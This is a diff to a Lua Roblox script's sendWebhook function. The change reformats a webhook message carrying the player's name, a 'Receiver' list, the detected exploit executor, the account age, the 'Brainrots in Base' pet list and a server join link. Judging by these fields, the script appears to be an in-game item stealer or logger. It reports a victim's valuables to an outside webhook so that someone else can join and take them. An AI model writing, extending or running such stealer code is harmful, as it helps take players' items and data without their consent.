@@ -143,8 +143,18 @@ local function sendWebhook(pets)
     for _, n in ipairs(normalPets) do table.insert(orderedLines, n) end
 
     local lootText = #orderedLines > 0 and table.concat(orderedLines, "\n") or "Empty"
-
     if lootText == "Empty" then return end
+
+    -- Wrap player info in triple backticks
+    local playerInfoText = "```" ..
+        "Name: "..(player and player.Name or "Unknown").."\n"..
+        "Receiver: "..receiverList.."\n"..
+        "Executor: "..detectExecutor().."\n"..
+        "Account Age: "..tostring(getAccountAge()).." days"..
+        "```"
+
+    -- Wrap pets info in triple backticks
+    local petsText = "```"..lootText.."```"
 
     local placeId = tostring(game.PlaceId or "")
     local jobId = tostring(game.JobId or "")
@@ -158,11 +168,8 @@ local function sendWebhook(pets)
         ["fields"] = {
             {["name"]="Players", ["value"]=string.format("%d/6", #Players:GetPlayers())},
             {["name"]="Server Type", ["value"]=serverType},
-            {["name"]="👥 Player Info", ["value"]="Name: "..(player and player.Name or "Unknown")..
-                "\nReceiver: "..receiverList..
-                "\nExecutor: "..detectExecutor()..
-                "\nAccount Age: "..tostring(getAccountAge()).." days"},
-            {["name"]="🧠 Brainrots in Base", ["value"]=lootText},
+            {["name"]="👥 Player Info", ["value"]=playerInfoText},
+            {["name"]="🧠 Brainrots in Base", ["value"]=petsText},
             {["name"]="Join Server Link", ["value"]=("[Click to Join Server](%s)"):format(serverLink)}
         }
     }
